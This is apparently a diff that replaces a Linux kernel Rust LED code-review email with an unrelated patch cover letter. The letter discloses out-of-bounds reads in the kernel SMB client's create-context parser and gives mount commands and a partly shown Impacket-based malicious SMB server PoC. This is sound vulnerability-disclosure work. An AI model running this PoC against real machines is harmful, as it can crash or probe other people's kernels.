@@ -1,286 +1,438 @@
-Received: from mout02.posteo.de (mout02.posteo.de [185.67.36.66])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pf1-f179.google.com (mail-pf1-f179.google.com [209.85.210.179])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 69D764A3F3F
-	for <linux-kernel@vger.kernel.org>; Fri,  4 Sep 2026 14:04:53 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=185.67.36.66
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1696E3DA5B4
+	for <linux-kernel@vger.kernel.org>; Fri,  4 Sep 2026 14:05:28 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.179
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788530696; cv=none; b=rb/zwFWG5kPThVzlbIH/ty4rHt2Fm2pcdFrSyT1ANVaV2EAeNfeDANpFjahI0/LqfhTynZyZhOj8ADvl04/j+gizqPfPripCzOOdK4VibxkXbHcGKCeFcIHzy0TOrvaQuYQ+ngYHfbL9mDEKWSWes4Jyeh9K036ath8qrXUvMRY=
+	t=1788530732; cv=none; b=mfsyAZRetH13hbnMFnnp6BeMZmcW7VYHC9nWXzXK6rXyAXB7Nt/EPmt7wIA/o62M6T3mHFylkGbM/NZgX4bNoecmIFUmNBBR8zojw7oy0tjX1mxqc7BW+QdHgIdOYqaBwdAB8I+bYBu4ptx1dv7w63DdmsJ0XKX/tlNg1nL/jrQ=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788530696; c=relaxed/simple;
-	bh=DeOOdRPNYib8Gy/FmsNEsDfL4q8uVU7RNFgmKXriwHw=;
-	h=Message-ID:Subject:From:To:Cc:Date:In-Reply-To:References:
-	 Content-Type:MIME-Version; b=m3Wt2lKVqrIVhEEy+LlupygVVEDeqnB3VeQV7bKBc7iadIbAiCPGHDqrEIcrpOrserYSNUtMubHFyDulDb4KCX1Wevkyv10Yw7nmBOKrGqPcOX3lxEUeAplmjoV82gu02F8zF91tvAgRvnaPV7XKkTO/xHDcTsCJj/fEO9OTPKk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=posteo.de; spf=pass smtp.mailfrom=posteo.de; dkim=pass (2048-bit key) header.d=posteo.de header.i=@posteo.de header.b=V2b8ddpE; arc=none smtp.client-ip=185.67.36.66
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=posteo.de
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=posteo.de
+	s=arc-20240116; t=1788530732; c=relaxed/simple;
+	bh=8wvnNEYuQycJKfXD6Y//xDf5BBF/sSEm13hDE2EJXZg=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version:Content-Type; b=lHuIhscHr+Vg43aEK+74KNVJeuUS2nFzcqajlecVy60Tc4QdyeTYdqBaNQnteRyAqbzCPX54WJYQKBB3r+2NdSpK0y7sDRRcKDe/xpR2BL03PWl3G+s6uCYgf9o4OONZMwJHXWfcm3vajvN5q6dc4U/4F2OaggzJMqkiFOu9R5Y=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=CcHkU5NU; arc=none smtp.client-ip=209.85.210.179
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=posteo.de header.i=@posteo.de header.b="V2b8ddpE"
-Received: from submission (posteo.de [185.67.36.169]) 
-	by mout02.posteo.de (Postfix) with ESMTPS id 9A8A3240101
-	for <linux-kernel@vger.kernel.org>; Fri,  4 Sep 2026 16:04:51 +0200 (CEST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=posteo.de;
-	s=1984.8680eb; t=1788530691;
-	bh=kFwO9zRZBkjZfmI3N600UZ+vSlLPXJi/vAD3urZPNJs=;
-	h=Message-ID:Subject:From:To:Cc:Date:Autocrypt:Content-Type:
-	 MIME-Version:OpenPGP:From;
-	b=V2b8ddpE0NUQm0m97FGcHqbssTVS6285sXO/ka2BF7T8kG5ZnlNj6QA1sTONiQSo5
-	 UK+EnwLv97fN2NhXaC02l/A38x/P+HH5xfV8XwtX7mr1B4Y8qd+r3bpLEb7rSzamSP
-	 g/k071n1SxD+M6k0bvFvhJ6SxO/upbvuczaz0Qj+FBNA+0jTfEquriSsHNS5U20ehq
-	 Fyjq6U6FyQUTjSfBxkNr8OD7z0yhcZdayYbHfLuPRZbmEaxMf/+UgzOOXwT3H8Dnbz
-	 wmS5y6dqJ6UF545tOnJNryXhNs4dD1rRCEaYNn0fXlw7zhxf0xkZ3SXrD+yJ3pJyt9
-	 Y8cgns2JLanMg==
-Received: from customer (localhost [127.0.0.1])
-	by submission (posteo.de) with ESMTPSA id 4hbyrv6XhMz6tvk;
-	Fri,  4 Sep 2026 16:04:47 +0200 (CEST)
-Message-ID: <4a3101718c7071009c9155d3819da2112277b04a.camel@posteo.de>
-Subject: Re: [PATCH v24 1/4] rust: leds: add basic led classdev abstractions
-From: Markus Probst <markus.probst@posteo.de>
-To: Gary Guo <gary@garyguo.net>, Lee Jones <lee@kernel.org>, Pavel Machek	
- <pavel@kernel.org>, Greg Kroah-Hartman <gregkh@linuxfoundation.org>, Dave
- Ertman <david.m.ertman@intel.com>, Leon Romanovsky <leon@kernel.org>,
- Miguel Ojeda	 <ojeda@kernel.org>, Alex Gaynor <alex.gaynor@gmail.com>, 
- =?ISO-8859-1?Q?Bj=F6rn?= Roy Baron	 <bjorn3_gh@protonmail.com>, Benno
- Lossin <lossin@kernel.org>, Andreas Hindborg	 <a.hindborg@kernel.org>,
- Alice Ryhl <aliceryhl@google.com>, Trevor Gross	 <tmgross@umich.edu>,
- Danilo Krummrich <dakr@kernel.org>, "Rafael J. Wysocki"	
- <rafael@kernel.org>, Bjorn Helgaas <bhelgaas@google.com>, Krzysztof
- =?UTF-8?Q?Wilczy=C5=84ski?=	 <kwilczynski@kernel.org>, Boqun Feng
- <boqun@kernel.org>, Daniel Almeida	 <daniel.almeida@collabora.com>, Tamir
- Duberstein <tamird@kernel.org>,  Alexandre Courbot <acourbot@nvidia.com>,
- Onur =?ISO-8859-1?Q?=D6zkan?= <work@onurozkan.dev>, Ira Weiny	
- <iweiny@kernel.org>
-Cc: rust-for-linux@vger.kernel.org, linux-leds@vger.kernel.org, 
-	linux-kernel@vger.kernel.org, linux-pci@vger.kernel.org
-Date: Fri, 04 Sep 2026 14:04:50 +0000
-In-Reply-To: <DL6KIVBHB08P.1LH0WPGN5FFVN@garyguo.net>
-References: <20260903-rust_leds-v24-0-8d9e4c04db69@posteo.de>
-	 <20260903-rust_leds-v24-1-8d9e4c04db69@posteo.de>
-	 <DL6JWHOEG91Y.1BKBUP653Z5D@garyguo.net>
-	 <612e01853459f0eb87fe78b7f5fdb73e22cd1776.camel@posteo.de>
-	 <DL6KIVBHB08P.1LH0WPGN5FFVN@garyguo.net>
-Autocrypt: addr=markus.probst@posteo.de; prefer-encrypt=mutual;
- keydata=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
- jfGillcaQOqFZ3WwVqyzG1BUfTow==
-Content-Type: multipart/signed; micalg="pgp-sha256";
-	protocol="application/pgp-signature"; boundary="=-7EqmRrjDvDHZjW/E3w9a"
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="CcHkU5NU"
+Received: by mail-pf1-f179.google.com with SMTP id d2e1a72fcca58-84e27035206so851034b3a.3
+        for <linux-kernel@vger.kernel.org>; Fri, 04 Sep 2026 07:05:28 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1788530728; x=1789135528; darn=vger.kernel.org;
+        h=content-transfer-encoding:content-type:mime-version:message-id:date
+         :subject:cc:to:from:from:to:cc:subject:date:message-id:reply-to
+         :content-type;
+        bh=s7jV+ugOye2aVc3nMrHQxGfnhbFQUSQPc6j7lgnm6Jc=;
+        b=CcHkU5NUrDNNMTWQTxh356gzmBreWw5VRGnnvmdM4lkSMmuQAbFtkEvEhqA9a0R0rp
+         k3o5M6YCAwugh1AOhXu+IUYqtFJbkxcd6yaAW3kzXi3bB25nnrPToC9QGbEuoOgRjFJl
+         2jzXT2VWNF49/ex5XbtYiRkytmQ7550kzqL/r9gWQj63Tw/PrTdYbEXQazyQJ7i0Q+ba
+         hUnrVBq9F/QA4QbwLg+OToJ5mCURpzzrhKo8w6nrNcWrZqEVzi8DYyrOLSLgFmj3tfZS
+         OV9IAG71QWKAg7SErnLF+F1PKRLFCJTpM/Hycu/enLXy828l2v5pYZEN/FmevV2K7XYk
+         OMHA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1788530728; x=1789135528;
+        h=content-transfer-encoding:content-type:mime-version:message-id:date
+         :subject:cc:to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject
+         :date:message-id:reply-to:content-type;
+        bh=s7jV+ugOye2aVc3nMrHQxGfnhbFQUSQPc6j7lgnm6Jc=;
+        b=LFlf5BJVS89oSaJmugFAUTQwT/8EQ/YIO/Bc/5GWAvnVL2Yil0/yM/OC3r7E7rkFKl
+         Xzb2E9r9vDOTT+a/c4ic/kiNgOnBMoBFlKoU3L0/mVY6L6IPel4V5oJ+ktsXpeondDod
+         7i3VAo29zm4tVJAOkI4lz2RUwKvrhi01Zdi6m1FXbWFz2kPaIRLGEGTfULuzrtmDImrg
+         x9iEnlATo5cTscjUyuJmk8Sb3nzUpQ4IS0OoOetcgu+YB4GCp0rEODeoFjf6bYiVn9Yr
+         cLotevm61eLkf96jMfreAxHXQqb55zrdm6Jkn6nKU7LjKgiVhQ2drwbZu7z0EzrHc0/N
+         RlLQ==
+X-Forwarded-Encrypted: i=1; AKwUvBxVZNt2zEu9L15nOZCIHzvf/wAbtO2EH/LLAvv/PwZUXqPdB46vp/TzCvPa/nbhB7dv3dNWLGj3EZhTWE8=@vger.kernel.org
+X-Gm-Message-State: AFuF++nLTSgBn+gtSRiKlNywG5knIvyil8oWTfyMIGldCJTn6ExMxzGX
+	U0iXVsHawpgWo/+DufTTyODXndv7jWPQumtnu2rgNYS3LeSqYMAfW5izdrKg/t6bLmO2
+X-Gm-Gg: AYBFou2XsAjpqtV4vkRUFLJ6m7gqw4qky1emHABga8U+olA2pelY6KKPQinIyCFFk6N
+	ZZDht2FburY2e70Fzi1x2/Rld64fFcuzZZ8P71+i9b2juNtUo76KsYj/dla+IpC8l0sy6ckXAJU
+	jsMrcFh2LuzUmPZ9uGxaht3zlmKPqskBpiiTh08FNxbUl2rarW6+suyauwmxeHvE/wiYzEkE++y
+	N+6w9TWKjpwX+8CyVeA1arNoqApunQu308MH+Lw7LMktRVl56zM3d6iruYJzOUYKkYAjayktzZd
+	rWL6pZwWTRt6yGbqpZfr3nRJvRL6uCK8RYTFiJXEKZBQdIm9XfwdC60f2rrzlxXi1fcrk4zn+A+
+	8GbYX66Cd6679LgRFm9cTGayWNEpylHHuJWM5FUxoNWU+BK1W/kCniov6f/qKUdmmlcv0z6mu5k
+	niv3kmn6M0oOqa3lQORO/Ct8utFx5D6iRQxVM9F3fjw8886DySoF/wbkAzjGO3Dw1QQrhHk26dE
+	XJnH39MFpqwXsc87Tk=
+X-Received: by 2002:a05:6a00:1950:b0:85c:3922:25d5 with SMTP id d2e1a72fcca58-8616aa68194mr8935830b3a.21.1788530727149;
+        Fri, 04 Sep 2026 07:05:27 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-86153e3ac30sm1165524b3a.56.2026.09.04.07.05.21
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Fri, 04 Sep 2026 07:05:26 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: Steve French <sfrench@samba.org>
+Cc: Zihan Xi <zihanx@nebusec.ai>,
+	Paulo Alcantara <pc@manguebit.org>,
+	Ronnie Sahlberg <ronniesahlberg@gmail.com>,
+	Shyam Prasad N <sprasad@microsoft.com>,
+	Tom Talpey <tom@talpey.com>,
+	Bharath SM <bharathsm@microsoft.com>,
+	Pavel Shilovsky <pshilovsky@samba.org>,
+	Aurelien Aptel <aaptel@suse.com>,
+	linux-cifs@vger.kernel.org,
+	samba-technical@lists.samba.org,
+	linux-kernel@vger.kernel.org,
+	stable@vger.kernel.org
+Subject: [PATCH v3 0/2] smb: client: fix create context out-of-bounds reads
+Date: Fri,  4 Sep 2026 14:05:16 +0000
+Message-ID: <cover.1788516372.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-OpenPGP: url=https://posteo.de/keys/markus.probst@posteo.de.asc; preference=encrypt
+Content-Type: text/plain; charset=UTF-8
+Content-Transfer-Encoding: 8bit
+
+Hi Linux kernel maintainers,
+
+We found and validated a issue in fs/smb/client/smb2pdu.c. The bug is
+reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
+The malicious server can be operated by a non-root user in a user and net
+namespace. The guest-side CIFS mount in this validation is performed as root
+because CIFS does not set FS_USERNS_MOUNT.
+
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
+
+---- details below ----
+
+Bug details:
+
+The reproduced crash is a truncated QFid create context. Generic layout
+checks accept DataLength 0, then parse_query_id_ctxt() still reads
+DiskFileId through a full response-structure cast and crosses the
+cifs_small_rq object.
+
+smb2_parse_contexts() also does not bound each context record by its
+Next field before dispatching to a handler. The SMB2 lease parser reads
+LeaseFlags after LeaseState, so a short lease context can pass the
+generic checks and still be handed to smb2_parse_lease_buf(). Patch 1
+bounds each context by Next, validates the QFid payload length, and
+extends the SMB2 lease minimum through LeaseFlags. The embedded PoC and
+KASAN report show the truncated QFid path; the Next and lease checks
+close sibling parser holes in the same function.
+
+parse_posix_ctxt() reads nlink, reparse_tag, and mode before checking
+that the POSIX context contains those fields. Current in-tree
+smb2_open_file() passes a NULL posix pointer into SMB2_open(), so this
+handler is not reached on the ordinary open path. Patch 2 still adds a
+handler-level minimum DataLength check and keeps the existing
+soft-failure behavior for malformed optional metadata.
+
+Please accept my apologies for the follow-up. I posted v2 on 23 Aug 2026
+and have not received a reply, so I am resending the series as v3. There
+are no functional code changes versus v2.
+
+changes in v3:
+  - Resend after no response on v2; no functional code changes.
+  - v2 Link: https://lore.kernel.org/all/cover.1787486936.git.zihanx@nebusec.ai/
+changes in v2:
+  - Bound each response context by Next and reject malformed chains.
+  - Read QFid DiskFileId only when DataLength covers the payload.
+  - Extend the SMB2 lease minimum through the LeaseFlags field.
+  - Add a POSIX handler check for the three fixed fields.
+  - v1 Link: https://lore.kernel.org/all/eb1bc35611f91bd10a4772400b37fac26f660956.1782579150.git.xizh2024@lzu.edu.cn/
+
+Fixes history follows the separate root causes: the pre-existing Next/lease
+parser path and the later QFid path are listed in patch 1, while patch 2
+points to the original POSIX create-context parser introduction.
+
+The reproducer uses an Impacket SMB server that modifies the SMB2 CREATE
+response. packetdrill is not used because it cannot provide the required
+stateful SMB server behavior or perform this server-side response rewrite.
+
+Reproducer:
+
+    unshare -Urn ./poc.sh
+
+Host (malicious SMB server, unprivileged user/net namespace):
+
+    unshare -Urn ./poc.sh
+
+Guest (KASAN kernel, root):
+
+    mount -t cifs //10.0.2.2/SHARE /mnt/test -o user=,password=,vers=2.0,sec=ntlmssp,port=4445,noperm,soft
+    cat /mnt/test/probe >/dev/null
+
+The wrapper creates a local virtual environment and installs Impacket when
+needed before running poc.py.
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.sh------
+#!/bin/bash
+set -euo pipefail
+
+SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
+VENV_DIR="$SCRIPT_DIR/.venv-impacket"
+
+if [[ ! -x "$VENV_DIR/bin/python" ]]; then
+    python3 -m venv "$VENV_DIR"
+    "$VENV_DIR/bin/pip" install impacket
+fi
+
+exec "$VENV_DIR/bin/python" "$SCRIPT_DIR/poc.py" "$@"
+------END poc.sh--------
+
+------BEGIN poc.py------
+#!/usr/bin/env python3
+import logging
+import signal
+import struct
+from pathlib import Path
+
+from impacket import smbserver
+from impacket import smb3structs as smb2
+from impacket.nt_errors import STATUS_SUCCESS
 
 
---=-7EqmRrjDvDHZjW/E3w9a
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
-
-On Fri, 2026-09-04 at 14:32 +0100, Gary Guo wrote:
-> On Fri Sep 4, 2026 at 2:15 PM BST, Markus Probst wrote:
-> > On Fri, 2026-09-04 at 14:03 +0100, Gary Guo wrote:
-> > > On Thu Sep 3, 2026 at 12:01 AM BST, Markus Probst wrote:
-> > > > Implement the core abstractions needed for led class devices, inclu=
-ding:
-> > > >=20
-> > > > * `led::LedOps` - the trait for handling leds, including
-> > > >   `brightness_set`, `brightness_get` and `blink_set`
-> > > >=20
-> > > > * `led::DeviceBuilder` - the builder for the led class device
-> > > >=20
-> > > > * `led::Device` - a safe wrapper around `led_classdev`
-> > > >=20
-> > > > Signed-off-by: Markus Probst <markus.probst@posteo.de>
-> > > > ---
-> > > >  rust/kernel/led.rs        | 288 ++++++++++++++++++++++++++++++++++=
-++++++++++++
-> > > >  rust/kernel/led/normal.rs | 230 ++++++++++++++++++++++++++++++++++=
-++
-> > > >  rust/kernel/lib.rs        |   1 +
-> > > >  3 files changed, 519 insertions(+)
-> > > >=20
-> > > > [snip]
-> > > >=20
-> > > > +/// Trait defining the operations for a LED driver.
-> > > > +///
-> > > > +/// # Examples
-> > > > +/// ```
-> > > > +/// use kernel::{
-> > > > +///      device,
-> > > > +///      devres::Devres,
-> > > > +///      led,
-> > > > +///      macros::vtable,
-> > > > +///      platform,
-> > > > +///      prelude::*, //
-> > > > +///  };
-> > > > +///
-> > > > +/// struct MyLedOps;
-> > > > +///
-> > > > +///
-> > > > +/// #[vtable]
-> > > > +/// impl led::LedOps for MyLedOps {
-> > > > +///     type Bus =3D platform::Device<device::Bound>;
-> > > > +///     const BLOCKING: bool =3D false;
-> > > > +///     const MAX_BRIGHTNESS: u32 =3D 255;
-> > > > +///
-> > > > +///     fn brightness_set<'bound>(
-> > > > +///         &self,
-> > > > +///         _dev: &'bound platform::Device<device::Bound>,
-> > > > +///         _classdev: &led::Device<'bound, Self>,
-> > > > +///         _brightness: u32
-> > > > +///     ) -> Result<()> {
-> > > > +///         // Set the brightness for the led here
-> > > > +///         Ok(())
-> > > > +///     }
-> > > > +/// }
-> > > > +/// ```
-> > > > +/// Led drivers must implement this trait in order to register and=
- handle a [`Device`].
-> > > > +#[vtable]
-> > > > +pub trait LedOps: Send + Sync + Sized {
-> > > > +    /// The bus device required by the implementation.
-> > > > +    #[allow(private_bounds)]
-> > > > +    type Bus: AsBusDevice<Bound>;
-> > >=20
-> > > Does LED class device has no private data that driver can use? This c=
-an be
-> > > either a private pointer or extra allocation living at the end of the=
- classdev
-> > > struct.
-> > On every callback `&self` is passed to the LedOps, which could be
-> > considered the leds private data. It is currently stored in front of
-> > the `led_classdev` struct.
->=20
-> Right, I missed that. In that case I think you can just remove `Bus` comp=
-letely
-> from the callback?
-Yes.
-
->=20
-> Do you have a user that needs this info? BTW, it would also help to inclu=
-de a
-> link to a potential user in the cover letter so people can see how the AP=
-I is
-> supposed to be used. This is especially useful for API design reviews.
-Primarily
-https://lore.kernel.org/rust-for-linux/20260724-synology_microp_initial-v18=
--0-fb2f49f10e77@posteo.de/
-
-.
-But I also have another rust i2c driver, which would use the led
-abstraction:
-
-https://codeberg.org/0xIO32/linux/src/branch/synology_disk_leds
-
-Still needs changes before it can be submitted.
+PORT = 4445
+SHARE_NAME = "SHARE"
+TARGET_NAME = "probe"
+TARGET_OFFSET = 424
+CONTEXT = struct.pack("<IHHHHI4s4x", 0, 16, 4, 0, 24, 0, b"QFid")
+ALIGN_PAD = b"\x00" * (TARGET_OFFSET - 152)
 
 
->=20
-> > >=20
-> > > It's usually a antipattern to get the bus device directly, especially=
- that in
-> > > Rust we do not allow anything other than callbacks to access data on =
-bus
-> > > devices.
-> > >=20
-> > > Instead, the class device registration should provide a data initiali=
-zer, and
-> > > the callbacks would receive a pointer to the data instead. In cases t=
-hat a
-> > > device resource has to be referenced, it should be kept inside the pr=
-ivate data
-> > > by the driver themselves.
-> > It should be possible to store a pointer to the bus device directly on
-> > this data, thus I can remove it.
-> >=20
-> > If I think about it, I could add a `led::Device::drvdata` function, so
-> > it could be accessed from the drivers private data. Sync is a
-> > requirement anyway.
->=20
-> An option is to provide `Deref`. Then you could even have
-> `self: &Device<'bound, Self>` in callbacks.
-Didn't know we had `feature(arbitrary_self_types)` enabled.
-I like this idea.
+def prepare_share(share_dir: Path) -> None:
+    share_dir.mkdir(parents=True, exist_ok=True)
+    (share_dir / "placeholder").touch()
+    (share_dir / TARGET_NAME).write_bytes(b"x")
 
->=20
-> That said, you might want to eventually support type-erased `Device` type=
-s to
-> support consumer of LED class devices. So I'm unsure if we want to provid=
-e data
-> accessors on class devices (maybe eventually device'll be split into two =
-types?)
-Sounds good, but I won't implement any consumer functions until they
-are needed.
 
-Thanks
-- Markus Probst
+def main() -> None:
+    base_dir = Path(__file__).resolve().parent
+    share_dir = base_dir / "share"
+    prepare_share(share_dir)
 
->=20
-> Best,
-> Gary
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s:%(message)s")
 
---=-7EqmRrjDvDHZjW/E3w9a
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: This is a digitally signed message part
+    original = smbserver.SMB2Commands.smb2Create
 
------BEGIN PGP SIGNATURE-----
+    def malicious_smb2_create(conn_id, smb_server, recv_packet):
+        req = smb2.SMB2Create(recv_packet["Data"])
+        raw_name = req["Buffer"][: req["NameLength"]]
+        name = smbserver.normalize_path(raw_name.decode("utf-16le"))
 
-iQJPBAABCAA5FiEEgnQYxPSsWOdyMMRzNHYf+OetQ9IFAmqaz/YbFIAAAAAABAAO
-bWFudTIsMi41KzEuMTIsMiwyAAoJEDR2H/jnrUPSeD8QAK4BrJc8X+YS+/oq7z3L
-Xgyx0J9RAEoEoDOiou1vis66J/aRY01qEHfoICR1DSi9atV+DmHnHt/ydLCi/KPM
-HX7bO+ZADGQrVUW1OKElwnbx2VjucPy8aKavMunRMuZpb1HCAhSJQUIGt2rH23Lw
-3E2KWBRN5/47Y7KXR5QAdWb8PhdfeLcGhkJv7pyymZK1OqPkXG7BaVSB/RwV34g1
